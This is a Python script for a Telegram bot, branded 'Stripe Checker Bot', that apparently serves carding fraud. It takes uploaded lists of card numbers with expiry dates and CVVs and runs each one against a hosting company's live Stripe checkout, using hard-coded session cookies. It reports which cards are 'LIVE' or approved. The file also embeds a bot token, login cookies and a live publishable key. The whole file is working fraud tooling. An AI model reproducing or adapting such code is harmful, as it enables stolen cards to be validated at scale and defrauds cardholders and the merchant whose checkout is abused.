#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
import re
from bs4 import BeautifulSoup
import urllib3
import time
from typing import Dict, List, Tuple
import threading

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_ID = 5895491379
INVOICE_ID = 260528

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# تخزين البيانات
user_cards = {}
checking_status = {}

# ألوان للطباعة
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def fetch_invoice_data(invoice_id: int) -> Tuple[str, int, str, str, str]:
    url = f"https://vsys.host/viewinvoice.php?id={invoice_id}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761307804$o4$g1$t1761308098$j40$l0$h2017258656',
    }
    try:
        session = requests.Session()
        response = session.get(url, headers=headers, cookies=cookies, timeout=20, verify=False)
        response.raise_for_status()
        new_cookies = session.cookies.get_dict()
        stripe_mid = new_cookies.get('__stripe_mid', '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02')
        stripe_sid = new_cookies.get('__stripe_sid', '2a9c20ed-7d36-46e6-9b81-95addca2ce147b8f82')
        soup = BeautifulSoup(response.text, 'html.parser')
        m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', response.text, flags=re.IGNORECASE)
        session_id = m.group(0).split('/pay/')[1].split('#')[0] if m and '/pay/' in m.group(0) else ''
        total_row = soup.find('tr', class_='total-row') or soup.select_one('tr:contains("Total")')
        if not total_row:
            return None, None, None, None, f"{Colors.RED}❌ Total amount not found{Colors.RESET}"
        total_amount_text = total_row.find_all('td')[1].text.replace('$', '').strip()
        total_amount = int(float(total_amount_text) * 100) if total_amount_text else 0
        if not session_id or not total_amount:
            return None, None, None, None, f"{Colors.RED}❌ Failed to fetch session_id or amount{Colors.RESET}"
        return session_id, total_amount, stripe_mid, stripe_sid, None
    except Exception as e:
        return None, None, None, None, f"{Colors.RED}❌ Error fetching invoice: {str(e)[:50]}{Colors.RESET}"

def check_card(card_details: str, invoice_id: int) -> str:
    session_id, total_amount, stripe_mid, stripe_sid, error = fetch_invoice_data(invoice_id)
    if error:
        return error
    try:
        parts = card_details.strip().split('|')
        if len(parts) != 4:
            return f"{Colors.RED}❌ Invalid format{Colors.RESET}"
        card_number, exp_month, exp_year, cvc = parts
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
        }
        data_pm = (
            f'type=card&card[number]={card_number}&card[cvc]={cvc}&'
            f'card[exp_month]={exp_month}&card[exp_year]={exp_year}&'
            'billing_details[name]=Card+details+saad&'
            'billing_details[email]=renes98352%40neuraxo.com&'
            'billing_details[address][country]=IT&'
            'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
            f'muid={stripe_mid}&'
            f'sid={stripe_sid}&'
            'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
            'payment_user_agent=stripe.js%2F6440ee8f22%3B+stripe-js-v3%2F6440ee8f22%3B+checkout'
        )
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_pm, timeout=20)
        pm_res = r1.json()
        if 'id' not in pm_res:
            return f"{Colors.RED}❌ {pm_res.get('error', {}).get('message', 'Failed to create PM')}{Colors.RESET}"
        pm_id = pm_res['id']
        data_confirm = (
            f'eid=NA&payment_method={pm_id}&expected_amount={total_amount}&'
            f'last_displayed_line_item_group_details[subtotal]={total_amount}&'
            'last_displayed_line_item_group_details[total_exclusive_tax]=0&'
            'last_displayed_line_item_group_details[total_inclusive_tax]=0&'
            'last_displayed_line_item_group_details[total_discount_amount]=0&'
            'last_displayed_line_item_group_details[shipping_rate_amount]=0&'
            'expected_payment_method_type=card&'
            'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
            f'muid={stripe_mid}&'
            f'sid={stripe_sid}&'
            'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
            'version=6440ee8f22'
        )
        r2 = requests.post(
            f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
            headers=headers, data=data_confirm, timeout=20
        )
        confirm_res = r2.json()
        if 'payment_intent' not in confirm_res:
            time.sleep(5)
            new_session_id, new_total_amount, new_stripe_mid, new_stripe_sid, error = fetch_invoice_data(invoice_id)
            if error:
                return f"{Colors.RED}❌ Failed to fetch new session: {error}{Colors.RESET}"
            return check_card(card_details, invoice_id)
        pi = confirm_res['payment_intent']
        status = pi.get('status', 'unknown')
        if status == 'requires_action':
            next_action = pi.get('next_action', {})
            if next_action.get('type') == 'use_stripe_sdk':
                source_id = next_action.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if not source_id:
                    return f"{Colors.RED}❌ No 3DS source{Colors.RESET}"
                data_3ds = (
                    f'source={source_id}&'
                    'browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&'
                    'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                )
                r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data_3ds, timeout=20)
                tds_res = r3.json()
                trans_status = tds_res.get('ares', {}).get('transStatus', '?')
                details = {
                    'bin': card_number[:6],
                    'type': 'Unknown',
                    'bank': 'Unknown Bank',
                    'country': 'XX',
                    'emoji': '🏳️',
                    'status_3ds': trans_status,
                    'liability': False,
                    'enrolled': 'U'
                }
                if trans_status == 'N':
                    return {
                        'status': 'LIVE',
                        'message': '✅ Live - transStatus: N',
                        'details': details,
                        'time': round(time.time() - time.time(), 2)
                    }
                elif trans_status == 'R':
                    return {
                        'status': 'REJECTED',
                        'message': '❌ Rejected - transStatus: R',
                        'details': details,
                        'time': round(time.time() - time.time(), 2)
                    }
                elif trans_status == 'C':
                    return {
                        'status': 'CHALLENGE',
                        'message': '⚠️ Challenge - transStatus: C',
                        'details': details,
                        'time': round(time.time() - time.time(), 2)
                    }
                elif trans_status == 'Y':
                    return {
                        'status': 'APPROVED',
                        'message': '✅ Approved - transStatus: Y',
                        'details': details,
                        'time': round(time.time() - time.time(), 2)
                    }
                else:
                    return {
                        'status': 'UNKNOWN',
                        'message': f'ℹ️ transStatus: {trans_status}',
                        'details': details,
                        'time': round(time.time() - time.time(), 2)
                    }
            else:
                return {
                    'status': 'ERROR',
                    'message': f'❌ Next action: {next_action.get("type", "unknown")}',
                    'details': {},
                    'time': round(time.time() - time.time(), 2)
                }
        elif status == 'succeeded':
            return {
                'status': 'APPROVED',
                'message': '✅ Approved Direct',
                'details': {
                    'bin': card_number[:6],
                    'type': 'Unknown',
                    'bank': 'Unknown Bank',
                    'country': 'XX',
                    'emoji': '🏳️',
                    'status_3ds': 'succeeded',
                    'liability': True,
                    'enrolled': 'Y'
                },
                'time': round(time.time() - time.time(), 2)
            }
        else:
            error = pi.get('last_payment_error', {})
            msg = error.get('message', error.get('code', status))
            return {
                'status': 'ERROR',
                'message': f'❌ {msg}',
                'details': {},
                'time': round(time.time() - time.time(), 2)
            }
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': f'❌ Error: {str(e)[:50]}',
            'details': {},
            'time': round(time.time() - time.time(), 2)
        }

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line and len(line.split('|')) == 4:
                cards.append({'raw': line})
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        user_cards[user_id] = cards
        checking_status[user_id] = False
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Stripe
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔑 Connecting to Stripe..."
    )
    live = approved = challenge = rejected = errors = checked = 0
    start_time = time.time()
    failed_count = 0
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        checked += 1
        result = check_card(card['raw'], INVOICE_ID)
        card['result'] = result
        card_num = card['raw'].split('|')[0]
        masked = f"{card_num[:4]}****{card_num[-4:]}" if len(card_num) >= 8 else card_num
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        status_3ds = result.get('details', {}).get('status_3ds', 'Unknown')
        callback_data = f"show_result_{checked}"
        keyboard.add(
            types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
        )
        keyboard.add(
            types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Approved ✓ ➜ [{approved}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Challenge 🔐 ➜ [{challenge}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Rejected ❌ ➜ [{rejected}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
            types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
        )
        if result['status'] == 'LIVE':
            live += 1
            details = result['details']
            msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec

🏦 BIN Info:
├ BIN: <code>{details['bin']}</code>
├ Type: {details['type']}
├ Bank: {details['bank']}
└ Country: {details['country']} {details['emoji']}

🔒 3DS Info:
├ Status: {details['status_3ds']}
├ Liability: {'✅ Shifted' if details['liability'] else '❌ Not Shifted'}
└ Enrolled: {details['enrolled']}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            bot.send_message(user_id, msg)
            failed_count = 0
        elif result['status'] == 'APPROVED':
            approved += 1
            failed_count = 0
        elif result['status'] == 'CHALLENGE':
            challenge += 1
            failed_count = 0
        elif result['status'] == 'REJECTED':
            rejected += 1
            failed_count = 0
        else:
            errors += 1
            failed_count += 1
            if failed_count >= 5:
                bot.send_message(user_id, "⚠️ Too many errors, stopping...")
                checking_status[user_id] = False
                return
        progress = int((checked / total) * 20)
        progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        eta = (total - checked) / speed if speed > 0 else 0
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"""<b>🔥 Gateway: Stripe
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {masked}
</b>""",
                reply_markup=keyboard
            )
        except:
            pass
        time.sleep(0.5)
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ Approved ✓: {approved}
├ Challenge 🔐: {challenge}
├ Rejected ❌: {rejected}
├ Errors ⚠️: {errors}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_result_'))
def show_card_result(call):
    user_id = call.from_user.id
    index = int(call.data.split('_')[-1]) - 1
    if user_id not in user_cards or index >= len(user_cards[user_id]):
        bot.answer_callback_query(call.id, "❌ No result found!")
        return
    card = user_cards[user_id][index]
    result = card.get('result', {})
    details = result.get('details', {})
    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result.get('message', 'Unknown')}
⏱ Time: {result.get('time', 0)} sec"""
    if details:
        msg += f"""
🏦 BIN Info:
├ BIN: <code>{details.get('bin', 'N/A')}</code>
├ Type: {details.get('type', 'Unknown')}
├ Bank: {details.get('bank', 'Unknown Bank')}
└ Country: {details.get('country', 'XX')} {details.get('emoji', '🏳️')}

🔒 3DS Info:
├ Status: {details.get('status_3ds', 'N/A')}
├ Liability: {'✅ Shifted' if details.get('liability', False) else '❌ Not Shifted'}
└ Enrolled: {details.get('enrolled', 'U')}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(user_id, msg)
    bot.answer_callback_query(call.id, "📋 Result displayed!")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Only LIVE cards sent, others via button

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe
🔥 Speed: Ultra Fast
✅ Accuracy: High
🌍 Server: Active
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        parts = text.split('|')
        user_cards[message.from_user.id] = [{
            'raw': text
        }]
        checking_status[message.from_user.id] = False
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        card_num = parts[0]
        masked = f"{card_num[:6]}...{card_num[-4:]}" if len(card_num) >= 8 else card_num
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{masked}</code>
🔥 Gateway: Stripe
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV
Example: 5127740080852575|03|2027|825
</b>""")

if __name__ == "__main__":
    print("🚀 Starting Stripe Checker Bot...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("✅ Bot is running...\n")
    bot.polling(none_stop=True)
